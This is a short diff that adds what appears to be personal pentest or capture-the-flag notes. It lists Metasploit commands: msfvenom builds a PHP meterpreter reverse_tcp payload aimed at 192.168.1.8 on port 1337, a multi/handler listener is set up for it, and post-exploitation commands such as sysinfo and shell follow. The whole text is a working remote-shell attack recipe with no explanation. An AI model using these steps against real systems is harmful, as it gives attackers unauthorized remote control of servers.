@@ -1,0 +1,11 @@
+msfvenom -p php/meterpreter/reverse_tcp lhost= 192.168.1.8 lport=1337
+
+msf5 > use multi/handler
+msf5 exploit(multi/handler) > set payload php/meterpreter/reverse_tcp
+msf5 exploit(multi/handler) > set lhost 192.168.1.8
+msf5 exploit(multi/handler) > set lport 1337
+msf5 exploit(multi/handler) > run
+
+sysinfo
+shell
+pwd
